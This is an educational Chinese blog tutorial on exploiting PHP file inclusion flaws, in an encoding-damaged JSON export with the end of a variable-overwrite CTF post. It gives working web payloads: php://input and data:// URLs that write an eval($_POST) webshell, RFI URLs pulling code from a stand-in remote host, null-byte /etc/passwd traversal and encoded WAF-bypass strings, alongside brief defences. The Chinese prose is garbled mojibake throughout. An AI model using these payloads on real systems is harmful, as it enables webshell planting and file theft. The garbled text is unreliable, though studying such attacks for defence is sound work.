ä¸ºç¬¬äºŒä¸ªforeachè¯­å¥ä¿®æ”¹äº†$flagåŸæ¥çš„å€¼ä¸ºPOSTä¼ é€’çš„flagå‚æ•°çš„å€¼ï¼Œå› è€Œæœ€åä¸€ä¸ªifè¯­å¥çš„æ¡ä»¶æ˜¯æ’ä¸æˆç«‹çš„ï¼Œåœ¨å…¶åçš„elseä»£ç å—é€»è¾‘ä¸­echoè¾“å‡ºå‡ºæ¥çš„åªèƒ½æ˜¯ä¿®æ”¹äº†çš„$flagçš„å€¼å³POSTä¼ é€’çš„flagå‚æ•°çš„å€¼è€ŒéåŸæœ¬çš„$flagçš„å€¼ã€æ¥ç€è¾“å‡º$_200å˜é‡çš„å€¼ã€‚ è¦æƒ³è¾“å‡ºåŸæœ¬çš„$flagçš„å€¼ï¼Œæˆ‘ä»¬éœ€è¦å°†åŸæœ¬çš„$flagè¦†ç›–$_200å˜é‡ï¼Œå› æ­¤åœ¨ç¬¬ä¸€ä¸ªforeachè¯­å¥ä¸­é€šè¿‡GETè¾“å…¥_200=flagï¼Œä»è€Œå¾—åˆ°çš„$$keyä¸º$_200 ä»¥åŠ$$valueä¸º$flagï¼Œä»è€Œå®ç°åœ¨ä¿®æ”¹$flagçš„å€¼ä¹‹å‰å°†å…¶è¦†ç›–åˆ°$_200å˜é‡ä¸­ã€‚ éªŒè¯ç»“æœï¼š Reference ã€Šç™½å¸½å­è®²Webå®‰å…¨ã€‹ PHPå˜é‡è¦†ç›–æ¼æ´å°å°ç»“â€”â€”mi1k7ea PHPå˜é‡è¦†ç›–æ€»ç»“â€”â€”Y4er PHPå˜é‡è¦†ç›–æ€»ç»“â€”â€”p0sec","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"},{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"å˜é‡è¦†ç›–","slug":"å˜é‡è¦†ç›–","permalink":"http://ca0y1h.top/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨","date":"2019-11-15T13:03:40.000Z","path":"Web_security/basic_learning/13.æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨/","text":"Webå®‰å…¨å­¦ä¹ ä¹‹æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨ è¿™ä¸€ç¯‡ä¸»è¦æ¥èŠä¸€èŠPHPçš„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¸»è¦åŒ…æ‹¬æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLocal File Inclusionï¼ŒLFIï¼‰ã€è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRemote File Inclusionï¼Œ RFIï¼‰å’ŒPHPä¼ªåè®®çš„åˆ©ç”¨ã€‚ æ–‡ä»¶åŒ…å«çš„åŸºæœ¬æ¦‚å¿µ ä¸¥æ ¼æ¥è¯´ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´æ˜¯ä»£ç æ³¨å…¥çš„ä¸€ç§ï¼Œå…¶åŸç†å°±æ˜¯æ³¨å…¥ä¸€æ®µç”¨æˆ·èƒ½æ§åˆ¶çš„è„šæœ¬æˆ–ä»£ç ï¼Œä½¿æœåŠ¡å™¨ç«¯æ‰§è¡Œã€‚è‡³äºæ–‡ä»¶åŒ…å«ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§â€œå¤–éƒ¨æ•°æ®æµåŒ…å«â€ï¼Œè¿™ä¸ªå¤–éƒ¨æ•°æ®æµå¯ä»¥æ˜¯æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯POSTæ•°æ®æµçš„å½¢å¼ã€‚ å¯¹äºPHPå…·ä½“è€Œè¨€ï¼Œæœ‰ï¼”ä¸ªå¯åˆ©ç”¨çš„å‡½æ•°ï¼š 1234require()require_once()include()include_once() å½“ä½¿ç”¨è¿™4ä¸ªå‡½æ•°åŒ…å«ä¸€ä¸ªæ–°æ–‡ä»¶æ—¶è¯¥æ–‡ä»¶å°†ä½œä¸ºPHPä»£ç æ‰§è¡Œï¼ŒPHPå†…æ ¸å¹¶ä¸ä¼šåˆ¤æ–­è¯¥è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœè¢«åŒ…å«çš„txtæ–‡ä»¶ã€å›¾ç‰‡æ–‡ä»¶ã€è¿œç¨‹URLéƒ½ä¼šä½œä¸ºPHPä»£ç è¢«æ‰§è¡Œã€‚ ä¸¾ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­æ¥çœ‹çœ‹ï¼š 123&lt;?phpinclude($_GET[test]); ?&gt; fortest.txtæ–‡ä»¶å†…å®¹ï¼š 1234for test&lt;?phpphpinfo();?&gt; é¡µé¢ç»“æœï¼š è¦æƒ³æˆåŠŸåˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œéœ€è¦æ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶ï¼š include()ç­‰å‡½æ•°é€šè¿‡åŠ¨æ€å˜é‡çš„æ–¹å¼å¼•å…¥éœ€è¦åŒ…å«çš„æ–‡ä»¶ï¼› ç”¨æˆ·èƒ½æ§åˆ¶è¯¥åŠ¨æ€å˜é‡ã€‚ è¿œç¨‹æ–‡ä»¶åŒ…å« å¦‚æœPHPçš„é…ç½®é€‰é¡¹allow_url_includeä¸ºONçš„è¯ï¼Œåˆ™include/requireå‡½æ•°æ˜¯å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶çš„ï¼Œè¿™ç§æ¼æ´ç§°ä¸ºè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ¯”å¦‚ï¼š 1234&lt;?php $basePath = $_GET[&#x27;path&#x27;]; require_once $basePath . &quot;/action/m_share.php&quot;?&gt; ä¸Šé¢çš„ä»£ç çœ‹ä¼¼å°†è·¯å¾„çš„ååŠæ®µå·²ç»è§„å®šäº†ï¼Œä½†åˆ©ç”¨HTTPå‚æ•°è¿˜æ˜¯æœ‰åŠæ³•ç»•è¿‡ï¼š 1http:&#x2F;&#x2F;localhost&#x2F;FileInclude&#x2F;index.php?path&#x3D;http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;solution.php? æ‰€ä»¥å®é™…çš„æ‰§è¡Œä»£ç å°±æ˜¯ï¼š 1require_once &quot;http://localhost/FileInclude/index.php?path=http://localhost/test/solution.php?/action/m_share.php&quot; å³ï¼Œé—®å·&quot;?&quot;åé¢çš„ä»£ç è¢«è§£é‡ŠæˆURLçš„querystringï¼Œè¿™ä¹Ÿæ˜¯ä¸€ç§&quot;æˆªæ–­&quot;æ€æƒ³ï¼Œå’Œ%00ä¸€æ ·ã€‚ é˜²å¾¡æ–¹æ³•ï¼šå…³é—­è¿œç¨‹æ–‡ä»¶åŒ…å«çš„é…ç½®é”™è¯¯ï¼Œå³allow_url_include = Off æœ¬åœ°æ–‡ä»¶åŒ…å« èƒ½è¿‡æ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œè¢«ç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ çœ‹åˆ°è¿™é‡Œï¼Œåˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«æˆ‘ä»¬å¯ä»¥æ‰§è¡Œæ”»å‡»è€…çš„ä»»æ„ä»£ç ï¼Œè€Œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´åªèƒ½æŸ¥çœ‹æˆ–è¿è¡Œæœ¬åœ°æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥ä½¿ç”¨PHPçš„ä¼ªåè®®ç­‰æ–¹å¼æ¥åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ¥ä¸‹æ¥è®²çš„æ˜¯å¦‚ä¸‹å‡ ç§åˆ©ç”¨æ–¹å¼ï¼š PHPä¼ªåè®®ï¼ˆè¾ƒä¸ºé€šç”¨ï¼‰ åŒ…å«Sessionæ–‡ä»¶ åŒ…å«æ—¥å¿—ï¼ˆè¾ƒä¸ºé€šç”¨ï¼‰ åŒ…å«environæ–‡ä»¶ åŒ…å«ä¸´æ—¶æ–‡ä»¶ åŒ…å«ä¸Šä¼ æ–‡ä»¶ PHPä¼ªåè®® php://åè®® 12php:&#x2F;&#x2F;inputphp:&#x2F;&#x2F;filter php://inputç”¨äºæ‰§è¡ŒPHPä»£ç ï¼Œphp://filterç”¨äºè¯»å–æºç ã€‚ php://filter php://filteræ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äº&quot;æ•°æ®æµæ‰“å¼€&quot;æ—¶çš„&quot;ç­›é€‰è¿‡æ»¤&quot;åº”ç”¨ï¼Œå¯¹æœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™ã€‚ç®€å•æ¥è®²å°±æ˜¯å¯ä»¥åœ¨æ‰§è¡Œä»£ç å‰å°†ä»£ç æ¢ä¸ªæ–¹å¼è¯»å–å‡ºæ¥ï¼Œåªæ˜¯è¯»å–ï¼Œä¸éœ€è¦å¼€å¯allow_url_includeã€‚ ç”¨æ³•ï¼š?file=php://filter/convert.base64-encode/resource=xxx.php å‡è®¾é¡µé¢çš„æºä»£ç index.phpä¸ºï¼š 1234567891011121314&lt;html&gt; &lt;title&gt;asdf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;;&#125; $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); ?&gt;&lt;/html&gt; 123url: http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.phpresult: PD9waHAgc3lzdGVtKCdpcGNvbmZpZycpOz8+ base64è§£å¯†å°±å¯ä»¥çœ‹åˆ°å†…å®¹ï¼Œè¿™é‡Œå¦‚æœä¸è¿›è¡Œbase64_encodeï¼Œåˆ™è¢«includeè¿›æ¥çš„ä»£ç å°±ä¼šè¢«æ‰§è¡Œï¼Œå¯¼è‡´çœ‹ä¸åˆ°æºä»£ç ã€‚ php://input php://inputåè®®ä¸»è¦ç”¨äºè®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµã€‚CTFä¸­ç»å¸¸ä½¿ç”¨file_get_contentsè·å–php://inputå†…å®¹(POST)ï¼Œéœ€è¦å¼€å¯allow_url_includeï¼Œå¹¶ä¸”å½“enctype=&quot;multipart/form-data&quot;çš„æ—¶å€™ php://inputæ˜¯æ— æ•ˆçš„ã€‚ åˆ©ç”¨æ–¹å¼ï¼š?file=php://input æ•°æ®åˆ©ç”¨POSTä¼ è¿‡å» ç¢°åˆ°file_get_contents()å°±è¦æƒ³åˆ°ç”¨php://inputç»•è¿‡ï¼Œå› ä¸ºphpä¼ªåè®®ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨httpåè®®çš„ï¼Œå³å¯ä»¥ä½¿ç”¨POSTæ–¹å¼ä¼ æ•°æ®ã€‚ å‡è®¾é¡µé¢æºä»£ç ä¸ºï¼š 1234567&lt;?php$file = $_GET[&#x27;file&#x27;];if (@file_get_content($file) == &#x27;meizijiu&#x27;) &#123; echo $flag;&#125;?&gt; ç›´æ¥ä½¿ç”¨Hackbarå·¥å…·POSTæ•°æ®ï¼š å¦å¤–è¿˜å¯ä»¥å†™å…¥ä¸€å¥è¯ï¼š 123456http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;php:&#x2F;&#x2F;inputpostæ•°æ®:&lt;?php echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4&#x3D;&quot;));?&gt; data://åè®® php.iniï¼šallow_url_include=Onã€allow_url_fopen()éƒ½ä¸ºOn åˆ©ç”¨data://ä¼ªåè®®è¿›è¡Œä»£ç æ‰§è¡Œçš„æ€è·¯åŸç†å’Œphp://æ˜¯ç±»ä¼¼çš„ï¼Œéƒ½æ˜¯åˆ©ç”¨äº†PHPä¸­çš„æµçš„æ¦‚å¿µï¼Œå°†åŸæœ¬çš„includeçš„æ–‡ä»¶æµé‡å®šå‘åˆ°äº†ç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥æµä¸­ã€‚ é¡µé¢ç¤ºä¾‹ä»£ç ï¼š 12345&lt;?phpecho &#x27;for test&#x27;;include($_GET[&#x27;file&#x27;]);?&gt; 123456http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZWNobyBmaWxlX3B1dF9jb250ZW50cygidGVzdC5waHAiLGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoyTmpKMTBwUHo0PSIpKTs&#x2F;Pg&#x3D;&#x3D; æœ€åä¸€ä¸ªURLä½¿ç”¨file_put_contents()å‡½æ•°å°†&lt;?php eval($_POST['cc'])?&gt;å†™åˆ°äº†test.phpæ–‡ä»¶å½“ä¸­ï¼Œå¦‚å›¾ï¼š phar://åè®® phpç‰ˆæœ¬ â‰¥ 5.3 phar://ï¼šPHP å½’æ¡£ï¼Œå¸¸å¸¸è·Ÿæ–‡ä»¶åŒ…å«ï¼Œæ–‡ä»¶ä¸Šä¼ ç»“åˆç€è€ƒå¯Ÿã€‚å½“æ–‡ä»¶ä¸Šä¼ ä»…ä»…æ ¡éªŒmimeç±»å‹ä¸æ–‡ä»¶åç¼€ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œåˆ©ç”¨ã€‚ åˆ©ç”¨æ–¹å¼ï¼šå†™å…¥ä¸€å¥è¯shell.php -&gt; å‹ç¼©ä¸ºshell.zip -&gt; ä¿®æ”¹åç¼€ä¸ºshell.jpg -&gt;ä¸Šä¼ åˆ°ç½‘ç«™ -&gt; phar://shell.jpg/shell.php å‡è®¾æœ‰ä¸ªæ–‡ä»¶phpinfo.txtï¼Œå…¶å†…å®¹ä¸º&lt;?php phpinfo(); ?&gt;ï¼Œæ‰“åŒ…æˆzipå‹ç¼©åŒ…ï¼Œå¦‚ä¸‹ï¼š æŒ‡å®šç»å¯¹è·¯å¾„ï¼š index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt zip://åè®® phpç‰ˆæœ¬ â‰¥ 5.3 åˆ©ç”¨å’Œæ„é€ zipåŒ…çš„æ–¹æ³•åŒphar://åè®®ï¼Œä½†ä½¿ç”¨zipåè®®ï¼Œéœ€è¦æŒ‡å®šç»å¯¹è·¯å¾„ï¼ŒåŒæ—¶å°†#ç¼–ç ä¸º%23ï¼Œä¹‹åå¡«ä¸Šå‹ç¼©åŒ…å†…çš„æ–‡ä»¶ã€‚ 12index.php?file&#x3D;zip:&#x2F;&#x2F;D:\\phpStudy\\WWW\\fileinclude\\test.zip%23phpinfo.txt åŒ…å«Sessionæ–‡ä»¶ å‰ææ¡ä»¶ï¼šSessionæ–‡ä»¶è·¯å¾„å·²çŸ¥ï¼Œä¸”å…¶ä¸­å†…å®¹çš„éƒ¨åˆ†å¯æ§ã€‚ é¦–å…ˆç¬¬ä¸€ä¸ªæ¡ä»¶ï¼šSessionçš„æ–‡ä»¶è·¯å¾„å¯ä»¥åœ¨php.iniä¸­çš„session.save_handlerå­—æ®µæŸ¥çœ‹åˆ°ï¼š ä¸€èˆ¬è€Œè¨€ï¼Œsessionæ–‡ä»¶çš„å­˜æ”¾ä½ç½®ä¸ºï¼š /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID ç¬¬äºŒä¸ªæ¡ä»¶ï¼šå†…å®¹å¯æ§ï¼Œè¿™ä¸ªè¦æ±‚è¾ƒä¸ºè‹›åˆ»ï¼Œæœ‰äº›æ—¶å€™ï¼Œå¯ä»¥å…ˆåŒ…å«è¿›sessionæ–‡ä»¶ï¼Œè§‚å¯Ÿé‡Œé¢çš„å†…å®¹ï¼Œç„¶åæ ¹æ®é‡Œé¢çš„å­—æ®µæ¥å‘ç°å¯æ§çš„å˜é‡ï¼Œä»è€Œåˆ©ç”¨å˜é‡æ¥å†™å…¥payloadï¼Œå¹¶ä¹‹åå†æ¬¡åŒ…å«ä»è€Œæ‰§è¡Œphpä»£ç ã€‚ åŒ…å«æ—¥å¿—æ–‡ä»¶ å‰ææ¡ä»¶ï¼šè¦çŸ¥é“æœåŠ¡å™¨æ—¥å¿—çš„å­˜å‚¨è·¯å¾„ï¼Œä¸”æ—¥å¿—æ–‡ä»¶å¯è¯»ã€‚ æœåŠ¡å™¨ä¸€èˆ¬å›åœ¨Web Serverçš„access_logé‡Œè®°å½•å®¢æˆ·ç«¯çš„è¯·æ±‚ä¿¡æ¯ï¼Œåœ¨error_logé‡Œè®°å½•å‡ºé”™ä¿¡æ¯ã€‚æ‰€ä»¥æ”»å‡»è€…å¯ä»¥é—´æ¥åœ°å°†PHPä»£ç å†™å…¥æ—¥å¿—æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶åŒ…å«æ—¶ï¼Œåªéœ€è¦åŒ…å«æ—¥å¿—æ–‡ä»¶å³å¯ã€‚ ä½†å¦‚æœæ˜¯ç›´æ¥å‘èµ·è¯·æ±‚ï¼Œä¼šå¯¼è‡´ä¸€äº›ç¬¦å·è¢«ç¼–ç ä½¿å¾—åŒ…å«æ— æ³•æ­£ç¡®è§£æã€‚å¯ä»¥ä½¿ç”¨burpæˆªåŒ…åä¿®æ”¹ã€‚ æ­£å¸¸çš„PHPä»£ç å·²ç»å†™å…¥äº† /var/log/apache2/access.logã€‚ç„¶åè¿›è¡ŒåŒ…å«å³å¯ã€‚ åŒ…å«environæ–‡ä»¶ /proc/self/environæ–‡ä»¶é‡Œé¢æœ‰Webè¿›ç¨‹è¿è¡Œæ—¶çš„ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­å¾ˆå¤šéƒ½æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ï¼Œæœ€å¸¸è§çš„åšæ³•å°±æ˜¯åœ¨User-Agentä¸­æ³¨å…¥PHPä»£ç ã€‚ è¿™é‡Œæœ‰å¾ˆå®Œæ•´çš„åˆ©ç”¨è¿‡ç¨‹è¯´æ˜ï¼š https://www.exploit-db.com/papers/12886 åŒ…å«ä¸´æ—¶æ–‡ä»¶ ä»¥ä¸Šè¿™äº›æ–¹æ³•éƒ½è¦æ±‚PHPèƒ½è¿‡åŒ…å«è¿™äº›ä¸å¤„äºWebç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¦‚æœPHPè®¾ç½®äº†open_basedirï¼Œåˆ™å¾ˆå¯èƒ½ä¼šä½¿å¾—æ”»å‡»å¤±æ•ˆã€‚ phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨/tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨c:\\winsdows\\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚ ç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowä¸‹åªæœ‰65535ä¸­ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚ å¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variablesï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶åï¼Œç›´æ¥åŒ…å«å³å¯ã€‚è¿™ä¸ªæ–¹æ³•å¯ä»¥å‚è€ƒ[LFI With PHPInfo Assistance](https://www.insomniasec.com/downloads/publications/LFI With PHPInfo Assistance.pdf) åŒ…å«ä¸Šä¼ æ–‡ä»¶ å°±ç»™ä¸€é“CTFçš„é¢˜å§ï¼Œæœ€è¿‘åœ¨ç©è¿™ä¸ªï¼Œè†œæ‹œä¸€ä¸‹å¤§ä½¬å†™çš„è„šæœ¬ã€‚ XMANå¤ä»¤è¥-2017-babyweb-writeup ç»•è¿‡æ–¹å¼ æ¯”å¦‚ä¸‹é¢è¿™æ®µä»£ç ï¼š 1234567&lt;?php$file = $_GET[&#x27;file&#x27;];if (file_exists(&#x27;/home/wwwrun/&#x27;.$file.&#x27;.php&#x27;)) &#123; include &#x27;/home/wwwrun/&#x27;.$file.&#x27;.php&#x27;;&#125;?&gt; è¿™æ®µä»£ç æŠŠinlcudeè·¯å¾„çš„å‰ç¼€éƒ¨åˆ†ã€åç¼€éƒ¨åˆ†éƒ½ç»™æ§åˆ¶ä½äº†ã€‚ç›¸æ¯”äºè¿è·¯å¾„çš„å‰ç¼€éƒ½ç”±ç”¨æˆ·æ§åˆ¶çš„é‚£ç§æ¼æ´å·²ç»å®‰å…¨å¤šäº†ã€‚ä½†æ˜¯è¿™é‡Œå­˜åœ¨å‡ ä¸ªé—®é¢˜ã€‚ 00å­—ç¬¦æˆªæ–­ è¿™ç§æ–¹å¼éœ€è¦ PHPç‰ˆæœ¬&lt;=5.2 ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶fileå‚æ•°ï¼Œå½“fileçš„å€¼ä¸º../../etc/passwd\\0æ—¶ï¼Œç›¸å½“äºæ‰§è¡Œäº†include '/home/wwwrun/../../etc/passwd'è¿™æ¡è¯­å¥ã€‚ å¦‚æœä¸é€‚ç”¨\\0æˆªæ–­çš„è¯ï¼Œè¢«åŒ…å«çš„æ–‡ä»¶å®é™…ä¸Šæ˜¯/etc/passwd.phpï¼Œä½†è¿™ä¸ªæ–‡ä»¶è‡ªç„¶æ˜¯ä¸å­˜åœ¨çš„ã€‚æ‰€ä»¥åœ¨è¿™ä¸ªåœ°æ–¹ï¼Œæ”»å‡»è€…åªè¦åœ¨æœ€ååŠ å…¥ä¸€ä¸ª0å­—èŠ‚ï¼ˆ\\x00ï¼‰ï¼Œå°±èƒ½æˆªæ–­fileå˜é‡ä¹‹åçš„å­—ç¬¦ä¸²ã€‚ å¦‚æœæ˜¯é€šè¿‡Webè¾“å…¥ï¼Œåªéœ€è¦UrlEencodeå˜ä¸ºï¼š 12..&#x2F;..&#x2F;etc&#x2F;passwd%00 é˜²å¾¡æ–¹å¼ï¼šè¿‡æ»¤\\00æˆªæ–­å­—ç¬¦ï¼Œè¿‡æ»¤ä»£ç å¦‚ä¸‹ï¼š 1234567891011&lt;?phpfunction getVal($name)&#123; $value = isset($_GET[$name]) ? $_GET[$name] : null; if (is_string($value)) &#123; $value = str_replace(&quot;\\0&quot;, &#x27;&#x27;, $value); &#125;&#125;?&gt; è¶…é•¿å­—ç¬¦æˆªæ–­ ç›®å½•å­—ç¬¦ä¸²åœ¨Windowsä¸‹256å­—èŠ‚ã€Linuxä¸‹4096å­—èŠ‚æ—¶ï¼Œä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œæœ€å¤§å€¼ä¹‹åçš„å­—ç¬¦è¢«ä¸¢å¼ƒã€‚å¯ä»¥é€šè¿‡./çš„æ–¹å¼æ„é€ ç›®å½•ï¼š 1234.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;abc&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;abc..&#x2F;1&#x2F;abc..&#x2F;1&#x2F;abc..&#x2F;1&#x2F;abc ç›®å½•éå† é™¤äº†è¿™ç§æ”»å‡»æ–¹å¼ï¼Œè¿˜å¯ä»¥ä½¿ç”¨&quot;â€¦/â€¦/â€¦/â€œè¿™æ ·çš„æ–¹å¼æ¥è¿”å›åˆ°ä¸Šå±‚ç›®å½•ä¸­ï¼Œè¿™ç§æ–¹å¼åˆè¢«ç§°ä¸º&quot;ç›®å½•éå†(Path Traversal)â€ã€‚å¸¸è§çš„ç›®å½•éå†æ¼æ´ï¼Œè¿˜å¯ä»¥é€šè¿‡ä¸åŒçš„ç¼–ç æ–¹å¼æ¥ç»•è¿‡ä¸€äº›æœåŠ¡å™¨ç«¯çš„é˜²å¾¡é€»è¾‘(WAF) ï¼š 123456789%2e%2e%2f -&gt; ..&#x2F;%2e%2e&#x2F; -&gt; ..&#x2F;..%2f -&gt; ..&#x2F;%2e%2e%5c -&gt; ..\\%2e%2e%\\ -&gt; ..\\..%5c -&gt; ..\\%252e%252e%255c -&gt; ..\\..%255c -&gt; ..\\ é˜²å¾¡æ–¹å¼ ç›®å½•éå†æ¼æ´æ˜¯ä¸€ç§è·¨è¶Šç›®å½•è¯»å–æ–‡ä»¶çš„æ–¹æ³•ï¼Œä½†å½“PHPé…ç½®äº†open_basediræ—¶ï¼Œå°†å¾ˆå¥½åœ°ä¿æŠ¤æœåŠ¡å™¨ï¼Œä½¿å¾—è¿™ç§æ”»å‡»æ— æ•ˆã€‚ open_basedirçš„ä½œç”¨æ˜¯é™åˆ¶åœ¨æŸä¸ªç‰¹å®šç›®å½•ä¸‹PHPèƒ½æ‰“å¼€çš„æ–‡ä»¶ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œopen_basedirçš„å€¼æ˜¯ç›®å½•çš„å‰ç¼€ï¼Œå¦‚æœè®¾ç½®å¦‚ä¸‹ï¼š 1open_basedir &#x3D; &#x2F;home&#x2F;aaa é‚£ä¹ˆä»¥ä¸‹çš„ç›®å½•éƒ½æ˜¯è¢«å…è®¸çš„ï¼š 123&#x2F;home&#x2F;aaa&#x2F;home&#x2F;aaa&#x2F;bbb&#x2F;home&#x2F;aaa&#x2F;ccc å¦‚æœè¦é™å®šä¸€ä¸ªæŒ‡å®šçš„ç›®å½•ï¼Œåˆ™éœ€è¦åœ¨åé¢åŠ ä¸Šä¸€ä¸ª/ï¼š 1&gt;open_basedir &#x3D; &#x2F;home&#x2F;aaa&#x2F; URLç»•è¿‡ queryï¼ˆ?ï¼‰ 1index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt? åˆ™åŒ…å«çš„æ–‡ä»¶ä¸º http://remoteaddr/remoteinfo.txt?/test/test.php ã€‚ é—®å·åé¢çš„éƒ¨åˆ†/test/test.phpï¼Œä¹Ÿå°±æ˜¯æŒ‡å®šçš„åç¼€è¢«å½“ä½œqueryä»è€Œè¢«ç»•è¿‡ã€‚ fragment(#) 1index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt%23 åˆ™åŒ…å«çš„æ–‡ä»¶ä¸ºhttp://remoteaddr/remoteinfo.txt#/test/test.php ã€‚ é—®å·åé¢çš„éƒ¨åˆ†/test/test.phpï¼Œä¹Ÿå°±æ˜¯æŒ‡å®šçš„åç¼€è¢«å½“ä½œfragmentä»è€Œè¢«ç»•è¿‡ã€‚æ³¨æ„éœ€è¦æŠŠ#è¿›è¡Œurlç¼–ç ä¸º%23ã€‚ é˜²å¾¡æ–¹å¼ 